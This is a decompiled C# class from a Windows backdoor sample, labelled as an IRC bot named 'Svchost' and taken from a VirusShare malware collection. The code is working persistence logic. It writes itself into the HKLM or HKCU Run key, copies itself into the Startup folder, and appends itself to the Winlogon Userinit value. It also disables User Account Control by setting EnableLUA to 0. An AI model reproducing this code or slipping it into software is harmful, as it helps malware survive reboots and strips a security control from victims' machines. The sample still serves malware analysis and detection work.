// Decompiled with JetBrains decompiler
// Type: myApp.Reg
// Assembly: Svchost, Version=1.0.3797.25400, Culture=neutral, PublicKeyToken=null
// MVID: E157A03A-FE69-4E7B-AD46-73B5B6218564
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Backdoor.MSIL.IrcBot.fy-ac791d112cad6f2a883c24cb5a554f1a826fa0afc8bb0e0be6dada5ff2c5a16d.exe

using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;

namespace myApp
{
  internal class Reg
  {
    public static void CheckReg()
    {
      string str1 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\dll\\svchost.exe";
      string str2 = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\dll.exe";
      try
      {
        RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
        if (registryKey.GetValue("dll") == null)
          registryKey.SetValue("dll", (object) str1);
        else if ((string) registryKey.GetValue("dll") != str1)
        {
          registryKey.DeleteValue("dll");
          registryKey.SetValue("dll", (object) str1);
        }
      }
      catch
      {
        try
        {
          RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);
          if (registryKey.GetValue("dll") == null)
            registryKey.SetValue("dll", (object) str1);
          else if ((string) registryKey.GetValue("dll") != str1)
          {
            registryKey.DeleteValue("dll");
            registryKey.SetValue("dll", (object) str1);
          }
        }
        catch
        {
          if (!File.Exists(str2))
          {
            try
            {
              File.Copy(Process.GetCurrentProcess().MainModule.FileName, str2);
            }
            catch
            {
            }
          }
        }
      }
      try
      {
        RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", true);
        string str3 = registryKey.GetValue("Userinit").ToString();
        if (!str3.Contains(str1))
          registryKey.SetValue("Userinit", (object) (str3 + str1 + ","));
      }
      catch
      {
      }
      try
      {
        RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", true);
        if (!(registryKey.GetValue("EnableLUA").ToString() == "1"))
          return;
        registryKey.SetValue("EnableLUA", (object) "0");
      }
      catch
      {
      }
    }
  }
}
